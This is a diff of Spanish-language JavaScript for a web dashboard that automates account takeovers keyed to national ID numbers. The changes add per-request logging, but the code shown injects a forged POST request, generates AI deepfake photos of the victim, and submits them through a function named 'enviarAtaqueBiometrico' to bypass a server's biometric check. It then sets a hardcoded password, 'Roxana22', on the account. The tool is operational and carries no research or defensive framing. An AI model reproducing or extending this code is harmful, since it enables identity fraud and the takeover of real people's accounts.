@@ -1679,6 +1679,46 @@ async function ejecutarInyeccionCompleta() {
 // Conjunto para evitar procesar la misma solicitud dos veces en paralelo
 const solicitudesEnEjecucion = new Set();
 
+// Registra un log vinculado a una solicitud específica (reflejándolo en consola, historial local y Supabase)
+function registrarLogSolicitud(idSolicitud, tipo, mensaje) {
+  addLog(tipo, mensaje);
+
+  const solicitudes = obtenerSolicitudesHistorial();
+  const index = solicitudes.findIndex(s => s.id === idSolicitud);
+  if (index !== -1) {
+    if (!Array.isArray(solicitudes[index].logs)) {
+      solicitudes[index].logs = [];
+    }
+    const ahora = new Date().toLocaleTimeString();
+    solicitudes[index].logs.push({
+      hora: ahora,
+      tipo: tipo,
+      mensaje: mensaje
+    });
+    if (solicitudes[index].logs.length > 100) {
+      solicitudes[index].logs = solicitudes[index].logs.slice(-100);
+    }
+    guardarSolicitudesHistorial(solicitudes);
+    sincronizarConSupabase(solicitudes[index]);
+
+    // Si el modal de detalle está abierto para esta solicitud, agregarlo en tiempo real
+    const modal = document.getElementById('modalDetalleSolicitud');
+    if (modal && modal.style.display !== 'none' && modal.getAttribute('data-active-id') === idSolicitud) {
+      const logsBox = document.getElementById('modalLogsBox');
+      if (logsBox) {
+        const emptyMsg = logsBox.querySelector('.modal-logs-empty');
+        if (emptyMsg) emptyMsg.remove();
+
+        const item = document.createElement('div');
+        item.className = `modal-log-item ${tipo}`;
+        item.innerHTML = `<span class="modal-log-time">[${ahora}]</span> <span class="modal-log-msg">${mensaje}</span>`;
+        logsBox.appendChild(item);
+        logsBox.scrollTop = logsBox.scrollHeight;
+      }
+    }
+  }
+}
+
 // Procesador autónomo en segundo plano (no depende de los valores actuales del DOM)
 async function procesarTramiteEnSegundoPlano(idSolicitud) {
   if (solicitudesEnEjecucion.has(idSolicitud)) {
@@ -1708,15 +1748,13 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
     // PASO 1: Inyectar Solicitud POST (si no tiene token previo)
     // ----------------------------------------------------
     if (!token) {
-      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
-      addLog('info', `[SEGUNDO PLANO - ${cedula}] PASO 1/3: Inyectando Solicitud POST de Trámite...`);
-      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+      registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] PASO 1/3: Inyectando Solicitud POST de Trámite...`);
       actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 1/3: Inyectando Solicitud POST...');
 
       const resInyeccion = await ejecutarInyeccionFirma(sol.datosPost);
       if (!resInyeccion.ok || !resInyeccion.link_biometria) {
         const errorMsg = resInyeccion.error || 'La inyección del trámite falló.';
-        addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+        registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
         actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
         solicitudesEnEjecucion.delete(idSolicitud);
         return;
@@ -1726,12 +1764,13 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
       token = resInyeccion.token || extraerTokenDeUrl(linkBiometria);
       if (!token) {
         const errorMsg = 'No se pudo obtener el token de validación del enlace generado.';
-        addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+        registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
         actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
         solicitudesEnEjecucion.delete(idSolicitud);
         return;
       }
 
+      registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] Solicitud POST inyectada con éxito. Token obtenido.`);
       actualizarEstadoSolicitud(idSolicitud, 'En Proceso', 'Paso 2/3: Trámite inyectado, iniciando biometría...', {
         token,
         linkBiometria
@@ -1744,7 +1783,7 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
     const fotoBase = sol.fotoPersona;
     if (!fotoBase || fotoBase.length < 50) {
       const errorMsg = 'No se encontró foto de referencia para generar biometría.';
-      addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+      registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
       actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
       solicitudesEnEjecucion.delete(idSolicitud);
       return;
@@ -1754,16 +1793,14 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
     let bypassAprobado = false;
 
     for (let intento = 1; intento <= maxIntentos; intento++) {
-      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
-      addLog('info', `[SEGUNDO PLANO - ${cedula}] PASO 2/3: Intento ${intento} de ${maxIntentos} - Generando Foto con IA...`);
-      addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+      registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] PASO 2/3: Intento ${intento} de ${maxIntentos} - Generando Foto con IA...`);
       actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Generando foto con IA...`);
 
       let generatedImageUrl = null;
 
       try {
         const imagenOptimizada = await optimizarImagenParaIA(fotoBase, 1024, 0.85);
-        addLog('info', `[SEGUNDO PLANO - ${cedula}] Imagen optimizada (${Math.round(imagenOptimizada.length / 1024)} KB). Solicitando a OpenAI...`);
+        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Imagen optimizada (${Math.round(imagenOptimizada.length / 1024)} KB). Solicitando a OpenAI...`);
 
         const response = await fetch(SUPABASE_PROXY_URL, {
           method: 'POST',
@@ -1796,30 +1833,30 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
           throw new Error('No se recibió la imagen de OpenAI.');
         }
 
-        addLog('info', `[SEGUNDO PLANO - ${cedula}] Foto generada. Procesando y preparando validación...`);
+        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Foto generada. Procesando y preparando validación...`);
         actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Procesando imagen...`);
 
         // Pausa de procesamiento en segundo plano (12 segundos)
         await new Promise(r => setTimeout(r, 12000));
 
-        addLog('info', `[SEGUNDO PLANO - ${cedula}] Enviando prueba biométrica al servidor...`);
+        registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Enviando prueba biométrica al servidor...`);
         actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 2/3: Intento ${intento}/${maxIntentos} - Validando en servidor...`);
 
         const resultado = await enviarAtaqueBiometrico(generatedImageUrl, token);
 
         if (resultado.ok) {
           bypassAprobado = true;
-          addLog('success', `[SEGUNDO PLANO - ${cedula}] ¡Validación biométrica APROBADA en el intento ${intento}!`);
+          registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] ¡Validación biométrica APROBADA en el intento ${intento}!`);
           break;
         } else {
-          addLog('warn', `[SEGUNDO PLANO - ${cedula}] Intento ${intento} rechazado por el servidor (${resultado.body ? resultado.body.trim() : '0'}).`);
+          registrarLogSolicitud(idSolicitud, 'warn', `[SEGUNDO PLANO - ${cedula}] Intento ${intento} rechazado por el servidor (${resultado.body ? resultado.body.trim() : '0'}).`);
           if (intento < maxIntentos) {
-            addLog('info', `[SEGUNDO PLANO - ${cedula}] Reintentando generación en 3 segundos (${intento + 1} de ${maxIntentos})...`);
+            registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] Reintentando generación en 3 segundos (${intento + 1} de ${maxIntentos})...`);
             await new Promise(r => setTimeout(r, 3000));
           }
         }
       } catch (errIntento) {
-        addLog('error', `[SEGUNDO PLANO - ${cedula}] Error en intento ${intento}: ${errIntento.message}`);
+        registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] Error en intento ${intento}: ${errIntento.message}`);
         if (intento < maxIntentos) {
           await new Promise(r => setTimeout(r, 3000));
         }
@@ -1828,7 +1865,7 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
 
     if (!bypassAprobado) {
       const errorMsg = 'Validación biométrica rechazada tras los intentos máximos permitidos.';
-      addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+      registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
       actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
       solicitudesEnEjecucion.delete(idSolicitud);
       return;
@@ -1837,25 +1874,22 @@ async function procesarTramiteEnSegundoPlano(idSolicitud) {
     // ----------------------------------------------------
     // PASO 3: Guardar Contraseña Fija
     // ----------------------------------------------------
-    addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
-    addLog('info', `[SEGUNDO PLANO - ${cedula}] PASO 3/3: Guardando Contraseña "${clave}" en Servidor...`);
-    addLog('info', `[SEGUNDO PLANO - ${cedula}] ========================================`);
+    registrarLogSolicitud(idSolicitud, 'info', `[SEGUNDO PLANO - ${cedula}] PASO 3/3: Guardando Contraseña "${clave}" en Servidor...`);
     actualizarEstadoSolicitud(idSolicitud, 'En Proceso', `Paso 3/3: Guardando contraseña ${clave}...`);
 
     const resPass = await guardarContrasenaEnServidor(token, clave);
 
     if (resPass.ok) {
-      addLog('success', `[SEGUNDO PLANO - ${cedula}] ¡TRÁMITE COMPLETADO Y APROBADO CON ÉXITO!`);
-      addLog('success', `[SEGUNDO PLANO - ${cedula}] Trámite creado -> Biometría aprobada -> Contraseña "${clave}" guardada.`);
+      registrarLogSolicitud(idSolicitud, 'success', `[SEGUNDO PLANO - ${cedula}] ¡TRÁMITE COMPLETADO Y APROBADO CON ÉXITO! Biometría aprobada y contraseña "${clave}" guardada.`);
       actualizarEstadoSolicitud(idSolicitud, 'Aprobada', 'Trámite inyectado, biometría validada y contraseña guardada con éxito.');
     } else {
       const errorMsg = 'Biometría aprobada pero ocurrió un fallo al guardar la contraseña.';
-      addLog('error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
+      registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO - ${cedula}] ${errorMsg}`);
       actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errorMsg);
     }
 
   } catch (errGlobal) {
-    addLog('error', `[SEGUNDO PLANO] Error crítico en trámite: ${errGlobal.message}`);
+    registrarLogSolicitud(idSolicitud, 'error', `[SEGUNDO PLANO] Error crítico en trámite: ${errGlobal.message}`);
     actualizarEstadoSolicitud(idSolicitud, 'Rechazada', errGlobal.message || 'Error en segundo plano.');
   } finally {
     solicitudesEnEjecucion.delete(idSolicitud);
@@ -1912,7 +1946,8 @@ function transformarSolicitudASupabase(sol) {
     datos_post: sol.datosPost || {},
     link_biometria: sol.linkBiometria || '',
     token: sol.token || '',
-    clave: sol.clave || 'Roxana22'
+    clave: sol.clave || 'Roxana22',
+    logs: Array.isArray(sol.logs) ? sol.logs : []
   };
 }
 
@@ -1932,7 +1967,8 @@ function transformarSolicitudDesdeSupabase(row) {
     datosPost: row.datos_post || {},
     linkBiometria: row.link_biometria || '',
     token: row.token || '',
-    clave: row.clave || 'Roxana22'
+    clave: row.clave || 'Roxana22',
+    logs: Array.isArray(row.logs) ? row.logs : []
   };
 }
 
@@ -2017,6 +2053,7 @@ function guardarSolicitudesHistorial(solicitudes) {
 
 function registrarNuevaSolicitud(datosIniciales) {
   const solicitudes = obtenerSolicitudesHistorial();
+  const horaActual = new Date().toLocaleTimeString();
   const nueva = {
     id: 'sol_' + Date.now() + '_' + Math.floor(Math.random() * 1000),
     fechaHora: new Date().toLocaleString(),
@@ -2034,7 +2071,14 @@ function registrarNuevaSolicitud(datosIniciales) {
     datosPost: datosIniciales.datosPost || {},
     linkBiometria: datosIniciales.linkBiometria || '',
     token: datosIniciales.token || '',
-    clave: datosIniciales.clave || 'Roxana22'
+    clave: datosIniciales.clave || 'Roxana22',
+    logs: [
+      {
+        hora: horaActual,
+        tipo: 'info',
+        mensaje: `Trámite registrado e iniciado para ${datosIniciales.nombres || ''} ${datosIniciales.apellidos || ''} (Cédula: ${datosIniciales.cedula || ''}).`
+      }
+    ]
   };
 
   solicitudes.unshift(nueva);
@@ -2310,7 +2354,38 @@ function mostrarDetalleSolicitud(id) {
         </div>
       ` : ''}
     </div>
+
+    <!-- Sección de Logs del Trámite -->
+    <div class="detalle-logs-header">
+      <span class="detalle-logs-title">Logs y Eventos del Trámite (${(sol.logs || []).length})</span>
+      <button type="button" id="btnCopiarLogsModal" class="btn-copiar-logs" title="Copiar logs de este trámite">Copiar Logs</button>
+    </div>
+
+    <div id="modalLogsBox" class="modal-logs-box">
+      ${(sol.logs && sol.logs.length > 0) ? sol.logs.map(log => `
+        <div class="modal-log-item ${log.tipo || 'info'}">
+          <span class="modal-log-time">[${log.hora || ''}]</span>
+          <span class="modal-log-msg">${log.mensaje || ''}</span>
+        </div>
+      `).join('') : '<div class="modal-logs-empty" style="color: #64748b; font-style: italic; font-size: 0.72rem;">No hay logs registrados para este trámite.</div>'}
+    </div>
   `;
+
+  // Activar botón para copiar los logs de este trámite al portapapeles
+  const btnCopiarLogsModal = body.querySelector('#btnCopiarLogsModal');
+  if (btnCopiarLogsModal) {
+    btnCopiarLogsModal.addEventListener('click', () => {
+      const logsTexto = (sol.logs || []).map(l => `[${l.hora}] [${(l.tipo || 'info').toUpperCase()}] ${l.mensaje}`).join('\n');
+      if (logsTexto) {
+        navigator.clipboard.writeText(logsTexto).then(() => {
+          btnCopiarLogsModal.textContent = '¡Copiado!';
+          setTimeout(() => { btnCopiarLogsModal.textContent = 'Copiar Logs'; }, 2000);
+        }).catch(() => {
+          btnCopiarLogsModal.textContent = 'Error al copiar';
+        });
+      }
+    });
+  }
 
   // Activar clic en las imágenes para abrir en grande
   body.querySelectorAll('.img-ampliable').forEach(img => {
